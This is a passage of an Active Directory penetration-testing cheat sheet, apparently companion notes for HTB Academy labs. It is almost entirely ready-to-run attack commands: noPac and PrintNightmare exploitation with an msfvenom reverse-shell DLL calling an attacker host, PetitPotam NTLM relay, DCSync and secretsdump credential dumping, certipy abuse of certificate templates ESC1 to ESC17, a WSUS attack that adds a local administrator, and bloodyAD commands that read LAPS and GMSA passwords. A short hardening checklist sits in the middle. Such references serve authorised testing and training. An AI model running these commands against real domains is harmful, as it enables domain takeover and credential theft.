Get-SQLQuery -Verbose -Instance "<SQL_HOST>,1433" -username "<DOMAIN>\<USER>" -password "<PASSWORD>" -query 'Select @@version'
```

```bash
mssqlclient.py <DOMAIN>/<USER>@<SQL_HOST> -windows-auth
```

```shell
winexe -U '<USERNAME%<PASSWORD>' //<RHOST> cmd.exe
winexe -U '<USERNAME%<PASSWORD>' --system //<RHOST> cmd.exe
```

#### Kerberos Double Hop

The double-hop problem occurs when a PowerShell remoting session cannot reuse the user's credentials for a second network hop.

```powershell
Enter-PSSession -ComputerName <HOST> -Credential <DOMAIN>\<USER>
klist

# Workaround: register a session configuration that runs as the target user
Register-PSSessionConfiguration -Name <CONFIG> -RunAsCredential <DOMAIN>\<USER>
Enter-PSSession -ComputerName <HOST> -Credential <DOMAIN>\<USER> -ConfigurationName <CONFIG>
```

Other approaches: CredSSP, constrained delegation, or Kerberos delegation. Check for unconstrained delegation and `TrustedForDelegation` accounts.

#### Bleeding-Edge AD Vulnerabilities

**noPac (CVE-2021-42278 / CVE-2021-42287)** — sAMAccountName spoofing:

```bash
git clone https://github.com/Ridter/noPac.git
sudo python3 scanner.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -use-ldap
sudo python3 noPac.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> \
  -dc-host <DC_HOST> -shell --impersonate administrator -use-ldap
sudo python3 noPac.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> \
  -dc-host <DC_HOST> --impersonate administrator -use-ldap \
  -dump -just-dc-user <DOMAIN>/administrator
```

**PrintNightmare (CVE-2021-1675 / CVE-2021-34527)** — print spooler:

```bash
rpcdump.py @<DC_IP> | egrep 'MS-RPRN|MS-PAR'
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=8080 -f dll > payload.dll
sudo smbserver.py -smb2support CompData /path/to/payload.dll
sudo python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> '\\<ATTACKER_IP>\CompData\payload.dll'
```

**PetitPotam + AD CS (ESC8)** — coerce a DC to authenticate to a relay:

```bash
sudo ntlmrelayx.py -debug -smb2support \
  --target http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>

# Use the issued certificate to obtain a TGT
python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>/<DC_HOST>$ \
  -pfx-base64 <PFX_BASE64> dc01.ccache
export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass \
  "<DC_HOST>$"@<DC_FQDN>
```

**Zerologon (CVE-2020-1472)** — only on unpatched DCs; check the patch level first. These attacks can be disruptive and are often detected.

#### ADIDNS, GPP & GPO Enumeration

```bash
# AD-integrated DNS records
adidnsdump -u '<DOMAIN>\<USER>' ldap://<DC_IP>
head records.csv
adidnsdump -u '<DOMAIN>\<USER>' ldap://<DC_IP> -r
```

```powershell
# SYSVOL scripts and Group Policy Preferences
ls \\<DC>\SYSVOL\<DOMAIN>\scripts
cat \\<DC>\SYSVOL\<DOMAIN>\scripts\<FILE>

Get-DomainGPO | select displayname
Get-GPO -All | Select DisplayName
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sid}
```

```bash
# GPP cpassword decryption and autologin discovery
gpp-decrypt <GPP_STRING>
crackmapexec smb <DC_IP> -u <USER> -p '<PASSWORD>' -M gpp_autologin
```

```cmd
Import-Module ./Powermad.ps1
$secureString = convertto-securestring "<PASSWORD>" -asplaintext -force
New-MachineAccount -MachineAccount <MACHINE_ACCOUNT> -Domain <DOMAIN> -DomainController <DOMAIN> -Password $secureString
```

#### AD Auditing & Hardening

```powershell
# Protected Users and reversible-password accounts
Get-ADGroup -Identity "Protected Users" -Properties Name,Description,Members
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |
  select samaccountname,useraccountcontrol
```

```powershell
# Auditing tools
PingCastle.exe --help
group3r.exe -f <filepath-name.log>
.\ADRecon.ps1
```

Hardening checklist:

- Tiered administration; separate Domain Admin, Server Admin, and Workstation Admin roles.
- LAPS for local administrator passwords; remove inactive accounts.
- Disable LLMNR/NBT-NS and mDNS where possible.
- Restrict Kerberos delegation; remove unconstrained delegation.
- Enforce LDAP signing/channel binding; protect AD CS templates.
- Patch DCs and monitor replication, DCSync, and privilege changes.
- Audit ACLs, SPNs, password policy, and privileged group membership.
- Use Protected Users for high-value accounts and disable reversible password storage.

> The AD skills-assessment sections are intentionally not summarized. Complete them in the HTB Academy lab.

### Account Operators Group Membership

#### Add User

```cmd
net user <USERNAME> <PASSWORD> /add /domain
net group "Exchange Windows Permissions" /add <USERNAME>
```

#### Import PowerView

```cmd
powershell -ep bypass
. .\PowerView.ps1
```

#### Add DCSync Rights

```cmd
$pass = convertto-securestring '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USERNAME>', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=<DOMAIN>,DC=<DOMAIN>" -PrincipalIdentity <USERNAME> -Rights DCSync
```

**DCSync**

```shell
impacket-secretsdump '<USERNAME>:<PASSWORD>@<RHOST>'
```

### Active Directory Certificate Services (AD CS)

```shell
certipy-ad find -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -vulnerable -stdout
```

#### ESC1: Misconfigured Certificate Templates

```shell
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -dns <RHOST>
certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
```

#### ESC2: Misconfigured Certificate Templates

```shell
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template '<TEMPLATE>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -on-behalf-of '<DOMAIN>\Administrator' -pfx <USERNAME>.pfx
```

#### ESC3: Enrollment Agent Templates

#### ESC4: Vulnerable Certificate Template Access Control

```shell
certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -template '<TEMPLATE>' -save-old
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target <RHOST> -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>'
```

```shell
certipy-ad req -ca '<CA>' -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <RHOST> -template '<TEMPLATE>' -target <RHOST> -upn 'Administrator@<DOMAIN>' -debug
```

#### ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2

```shell
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -upn 'Administrator@<DOMAIN>'
certipy-ad req -ca '<CA>' -username 'Administrator@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -upn 'Administrator@<DOMAIN>'
```

#### ESC7: Vulnerable Certificate Authority Access Control

```shell
certipy-ad ca -ca '<CA>' -add-officer '<USERNAME>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>'
certipy-ad ca -ca '<CA>' -enable-template SubCA -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template SubCA -upn 'Administrator@<DOMAIN>'
certipy-ad ca -ca '<CA>' -issue-request <ID> -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -retrieve <ID>
```

#### ESC8: NTLM Relay to AD CS HTTP Endpoints

```shell
certipy-ad relay -target 'http://<CA>'
certipy-ad relay -ca '<CA>' -template '<TEMPLATE>'
python3 PetitPotam.py <RHOST> <DOMAIN>
certipy-ad auth -pfx dc.pfx -dc-ip <RHOST>
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass <DOMAIN>/<RHOST>@<DOMAIN>
```

#### Coercing

```shell
impacket-ntlmrelayx -t http://<RHOST>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>
python3 gettgtpkinit.py -pfx-base64 $(cat base64.b64) '<DOMAIN>'/'<RHOST>' 'dc.ccache'
```

#### ESC9: No Security Extensions

```shell
certipy-ad shadow auto -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -account '<USERNAME>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn 'Administrator@<DOMAIN>'
certipy-ad req -ca '<CA>' -username '<USERNAME>' -hashes '<HASH>' -template '<TEMPLATE>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
certipy-ad auth -pfx Administrator.pfx -domain '<DOMAIN>'
```

```shell
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -user '<USERNAME>' -upn 'Administrator@<DOMAIN>'
certipy-ad req -ca '<CA>' -username '<USERNAME>' -password '<PASSWORD>' -template '<TEMPLATE>'
```

#### Alternative via Computer Object and Email

```shell
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add computer '<USERNAME>' '<PASSWORD>'
```

```shell
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
```

```shell
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add genericAll 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' '<USERNAME>'
```

```shell
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object <USERNAME> mail -v <EMAIL>
```

```shell
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -template '<TEMPLATE>'
```

```shell
certipy-ad auth -pfx <FILE>.pfx -domain '<DOMAIN>' -username '<USERNAME>@<DOMAIN>'
```

#### ESC10: Weak Certificate Mappings

#### Case 1

```shell
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>'
```

#### Case 2

```shell
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<RHOST>@<DOMAIN>'
certipy-ad req -ca 'CA' -username '<USERNAME>@<DOMAIN>' -password -hashes '<HASH>'
certipy-ad auth -pfx dc.pfx -dc-ip '<RHOST>' -ldap-shell
```

#### ESC11: IF_ENFORCEENCRYPTICERTREQUEST

```shell
certipy-ad relay -target 'rpc://<CA>' -ca 'CA'
certipy-ad auth -pfx administrator.pfx -domain '<DOMAIN>'
```

#### ESC12: YubiHSM2 Vulnerability (Specific Context)

```shell
certipy-ad forge -ca-pfx '<CA>.pfx' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-...-500' -crl 'ldap:///'
```

#### ESC13: Issuance Policy with Privileged Group Linked

```shell
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<CA>' -ca '<CA>' -template 'SecureAdminsAuthentication'
```

```shell
certipy-ad auth -pfx '<FILE>.pfx' -dc-ip '<RHOST>'
```

```shell
impacket-secretsdump -just-dc-user '<RHOST>$' '<DOMAIN>/<USERNAME>@<DOMAIN>' -dc-ip '<RHOST>' -target-ip '<RHOST>' -k -no-pass
```

#### ESC14: Weak Explicit Certificate Mapping

#### Scenario B: Target with X509RFC822 (email)

```shell
python3 entry.py find -u '<USERNAME>@<DOMAIN>' -hashes ':<HASH>' -dc-ip <RHOST> -esc14 -vulnerable -stdout -debug
```

```cmd
Set-ADUser -Identity <USERNAME> -Add @{'altSecurityIdentities'='X509:<RFC822><EMAIL>'}
```

```shell
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object <USERNAME> mail -v <EMAIL>
```

```shell
certipy-ad auth -pfx <FILE>.pfx -domain '<DOMAIN>' -username '<USERNAME>'
```

#### ESC15: Arbitrary Application Policy Injection in V1 Templates (CVE-2024-49019 "EKUwu")

#### Scenario A: Direct Impersonation via Schannel (Injecting "Client Authentication" Application Policy)

```shell
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'WebServer' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-...-500' -application-policies 'Client Authentication'
```

```shell
certipy-ad auth -pfx 'Administrator.pfx' -dc-ip '<RHOST>' -ldap-shell
```

#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse (Injecting "Certificate Request Agent" Application Policy)

```shell
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'WebServer' -application-policies 'Certificate Request Agent'
```

```shell
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'User' -pfx '<FILE>.pfx' -on-behalf-of '<DOMAIN>\Administrator'
```

```shell
certipy-ad auth -pfx 'Administrator.pfx' -dc-ip '<RHOST>'
```

#### ESC16: Security Extension Disabled on CA (Globally)

#### Scenario A: With UPN Manipulation (in Compatibility Mode - StrongCertificateBindingEnforcement = 1 or 0)

```shell
certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -user '<USERNAME>' read
```

```shell
certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn 'Administrator' -user '<USERNAME>' update
```

```shell
certipy-ad shadow -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -account '<USERNAME>' auto
```

```shell
certipy-ad req -k -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'User'
```

Revert the `UPN` to the original `user`.

```shell
certipy-ad auth -pfx 'Administrator.pfx' -username '<USERNAME>' -domain '<DOMAIN>' -dc-ip '<RHOST>'
```

#### Scenario B: Combined with ESC6 (CA allows SAN specification via request attributes)

```shell
certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn '<USERNAME>' -user '<USERNAME>' update
```

```shell
certipy-ad req -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'User' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-...-500'
```

#### ESC16 + ESC6

**ESC16: Security Extension Disabled on CA (Globally)**

```cmd
$CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "DisableExtensionList", "1.3.6.1.4.1.311.25.2")
```

```cmd
certutil -config "<RHOST>\<CA>" -getreg policy\DisableExtensionList
```

```cmd
Restart-Service CertSvc
```

#### ESC6: CA allows SAN specification via request attributes

```cmd
$CA = New-Object -ComObject CertificateAuthority.Admin;$Config = "<RHOST>\<CA>";$newFlags = 0x11014e -bor 0x40000;$CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $newFlags)
```

```shell
certipy-ad req -u '<USERNAME>' -p '<PASSWORD>' -dc-ip <RHOST> -ca '<CA>' -template 'User' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-858338346-3861030516-3975240472-500'
```

```shell
certipy-ad auth -pfx 'Administrator.pfx' -dc-ip <RHOST>
```

#### ESC17: Server Authentication Template Abuse

```shell
Invoke-Locksmith -Scan ESC17
```

```shell
wsuks -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' --dc-ip <RHOST> --only-discover
```

```shell
certipy-ad req -dc-ip <RHOST> -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -target '<CA>' -ca '<CA>' -dns <RHOST>
```

```shell
openssl pkcs12 -in <FILE>.pfx -out <FILE>.pem -nodes --passin pass:
```

```shell
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add dnsRecord <RHOST> <LHOST>
```

```shell
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get dnsDump | grep <RHOST>
```

```shell
nslookup <RHOST> <RHOST>
```

```shell
python3 pywsus.py -H <RHOST> -p 8531 -e PsExec64.exe -c '-accepteula -s cmd.exe /c net localgroup administrators <USERNAME> /add' --cert <FILE>.crt --key <FILE>.key
```

```shell
sudo wsuks -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' --dc-ip <RHOST> -t <RHOST> --WSUS-Server <RHOST> --tls-cert <FILE>.pem
```

```shell
sudo wsuks --serve-only --tls-cert <FILE>.pem -e PsExec64.exe -c '-accepteula -s cmd.exe /c net localgroup administrators <USERNAME> /add' -I <INTERFACE>
```

```shell
nxc smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth
```

#### Template Creation Abuse through dangerous CA Permissions

**Enumeration**

```shell
bloodyad --host <RHOST> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' get object "CN=<CA>,CN=<CN>,CN=<CN>,CN=<CN>,CN=<CN>,DC=<DOMAIN>,DC=<DOMAIN>" | grep -i certificateTemplates
bloodyad --host <RHOST> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' get object "CN=<CA>,CN=<CN>,CN=<CN>,CN=<CN>,CN=<CN>,DC=<DOMAIN>,DC=<DOMAIN>" | grep -A 20 "certificateTemplates"
```

#### Create Certificate Template

```shell
msfconsole -q
msf > use auxiliary/admin/ldap/ad_cs_cert_template
msf auxiliary(admin/ldap/ad_cs_cert_template) > set RHOST <RHOST>
msf auxiliary(admin/ldap/ad_cs_cert_template) > set USERNAME <USERNAME>
msf auxiliary(admin/ldap/ad_cs_cert_template) > set PASSWORD '<PASSWORD>'
msf auxiliary(admin/ldap/ad_cs_cert_template) > set DOMAIN <DOMAIN>
msf auxiliary(admin/ldap/ad_cs_cert_template) > set CERT_TEMPLATE <TEMPLATE>
msf auxiliary(admin/ldap/ad_cs_cert_template) > set Action CREATE
msf auxiliary(admin/ldap/ad_cs_cert_template) > run
```

#### Error Handling

#### Fixing Username or domain is not specified, and identity information was not found in the certificate Error

```shell
certipy-ad auth -pfx 'Administrator.pfx' -username 'Administrator' -domain '<DOMAIN>' -dc-ip '<RHOST>'
```

#### Fixing Object SID mismatch between certificate and user 'Administrator' Error

```shell
impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
```

```shell
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-2983547755-698260136-4283918172-500'
```

#### Fixing Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template Error

```shell
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>' -key-size '4096'
```

```cmd
Import-Module .\ADCSTemplate.psm1
New-ADCSTemplate -DisplayName TopCA -JSON (Export-ADCSTemplate -DisplayName 'Subordinate Certification Authority') -AutoEnroll -Publish -Identity '<DOMAIN>\Domain Users'
```

> https://github.com/GhostPack/Certify

```cmd
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser
```

> https://github.com/ly4k/Certipy

> https://github.com/ly4k/BloodHound/

```shell
certipy-ad find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <RHOST>
certipy-ad find -u '<USERNAME>' -p '<PASSWORD>' -dc-ip <RHOST> -vulnerable -stdout
```

#### Account Creation

```shell
certipy-ad account create -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -dns <RHOST> -user '<COMPUTERNAME>'
```

#### Authentication

```shell
certipy-ad auth -u '<USERNAME>' -pfx <FILE>.pfx -dc-ip <RHOST> -domain '<DOMAIN>'
```

#### LDAP-Shell

```shell
certipy-ad auth -u '<USERNAME>' -pfx <FILE>.pfx -dc-ip <RHOST> -domain '<DOMAIN>' -ldap-shell
```

```shell
# add_user <USERNAME>
# add_user_to_group <GROUP>
```

#### Certificate Forging

```shell
certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -template '<TEMPLATE>' -save-old
```

#### Certificate Request

Run the following command twice because of a current issue with `certipy`.

```shell
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -target '<FQDN>' -template '<TEMPLATE>'
```

```shell
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -target '<FQDN>' -template '<TEMPLATE>' -upn '<USERNAME>@<DOMAIN>' -dns '<FQDN>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -target '<FQDN>' -template '<TEMPLATE>' -upn '<USERNAME>@<DOMAIN>' -dns '<FQDN>' -debug
```

#### Revert Changes

```shell
certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -template '<TEMPLATE>' -configuration <TEMPLATE>.json
```

#### Start BloodHound Fork

```shell
./BloodHound --disable-gpu-sandbox
```

> https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

> https://github.com/AlmondOffSec/PassTheCert/tree/main/Python

```shell
certipy-ad cert -pfx <CERTIFICATE>.pfx -nokey -out <CERTIFICATE>.crt
certipy-ad cert -pfx <CERTIFICATE>.pfx -nocert -out <CERTIFICATE>.key
python3 passthecert.py -domain '<DOMAIN>' -dc-host '<DOMAIN>' -action 'modify_user' -target '<USERNAME>' -new-pass '<PASSWORD>' -crt ./<CERTIFICATE>.crt -key ./<CERTIFICATE>.key
evil-winrm -i '<RHOST>' -u '<USERNAME>' -p '<PASSWORD>'
```

### ADMiner

```shell
AD-miner -u <USERNAME> -p <PASSWORD> -cf <NAME>
```

### BloodHound-Legacy

```shell
sudo apt-get install openjdk-11-jdk
pip install bloodhound
sudo apt-get install neo4j
```

#### Installing and starting Database

```shell
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
sudo echo 'deb https://debian.neo4j.com stable 4.0' > /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
sudo apt-get install apt-transport-https
systemctl start neo4j
./bloodhound --no-sandbox
```

#### Docker Container

```shell
docker run -itd -p 7687:7687 -p 7474:7474 --env NEO4J_AUTH=neo4j/<PASSWORD> -v $(pwd)/neo4j:/data neo4j:4.4-community
```

#### Database Password Reset

```shell
ALTER USER neo4j SET PASSWORD '<PASSWORD>'
```

### bloodyAD

> https://github.com/CravateRouge/bloodyAD/wiki/User-Guide

> https://github.com/CravateRouge/bloodyAD/wiki/Access-Control

#### Get

```shell
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' get bloodhound                                                                                                    // Get BloodHound dump
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type user                                                                  // Get all users of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type computer                                                              // Get all computers of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type container                                                             // Get all containers of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get dnsDump                                                                                                         // Get AD DNS records
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object Users --attr member                                                                                      // Get group members
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get writable --detail                                                                                               // Get object permissions
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr msDS-Behavior-Version                                                   // Get AD functional level
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr minPwdLength                                                            // Get minimum password length policy
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr ms-DS-MachineAccountQuota                                               // Read quota for adding computer objects to domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<USERNAME>' --attr userAccountControl                                                                   // Get UserAccountControl flags
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object "CN=<CA>,CN=<CN>,CN=<CN>,CN=<CN>,CN=<CN>,DC=<DOMAIN>,DC=<DOMAIN>" | grep -i certificateTemplates         // Get published certificate templates
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object "CN=<CA>,CN=<CN>,CN=<CN>,CN=<CN>,CN=<CN>,DC=<DOMAIN>,DC=<DOMAIN>" | grep -A 20 "certificateTemplates"    // Get published certificate templates
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd                                                                    // Read LAPS password
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                                                             // Read GMSA account password
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                                                                      // Read GMSA account password using Kerberos
```

#### Set

```shell
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> --kerberos -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>'                                 // Set a password for a user
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object '<USERNAME>' servicePrincipalName                                                      // Set a Service Principal Name (SPN)
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName                                                               // Set a Service Principal Name (SPN) using Kerberos
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName -v 'cifs/<USERNAME>'                                          // Set a Service Principal Name (SPN) using Kerberos
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -k set object '<USERNAME>' altSecurityIdentities -v 'X509:<UPN=<USERNAME>@<DOMAIN>>/CN=<CN>'    // Set a email address within a certificate
bloodyAD --host <RHOST> -u <USERNAME> -p '<PASSWORD>' set object "CN=<USERNAME>,CN=Users,DC=<DOMAIN>,DC=<DOMAIN>" scriptPath -v <FILE>.bat                        // Set scriptPath for a user mapping to a script within scripts on SYSVOL
```

#### Add

```shell
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac '<MACHINE_ACCOUNT>$' -f TRUSTED_FOR_DELEGATION                                                      // Enable machine account for as trusted for delegation
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'                                                                      // Add user to a group
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add groupMember '<GROUP>' '<USERNAME>'                                                                               // Add user to a group using Kerberos
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add dnsRecord <RECORD> <LHOST>                                                                              // Add a new DNS entry
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac '<USERNAME>' DONT_REQ_PREAUTH                                                                       // Enable DONT_REQ_PREAUTH for ASREPRoast
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add uac '<USERNAME>' -f DONT_REQ_PREAUTH                                                                             // Enable DONT_REQ_PREAUTH for ASREPRoast using Kerberos
bloodyAD --host <RHOST> -i <RHOST> -d <DOMAIN> -u <USERNAME> -k ccache=<FILE>.ccache kdc=<RHOST> add user <USERNAME> '<PASSWORD>' --ou 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>'    // Add user to a specific OU
```

#### Remove

```shell
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove dnsRecord <RECORD> <LHOST>         // Remove a DNS entry
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove uac '<USERNAME>' ACCOUNTDISABLE    // Disable ACCOUNTDISABLE (enable account)
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k remove uac '<USERNAME>' -f ACCOUNTDISABLE          // Disable ACCOUNTDISABLE (enable account) using Kerberos
```

### enum4linux-ng

```shell
enum4linux-ng <RHOST>
enum4linux-ng -A <RHOST>
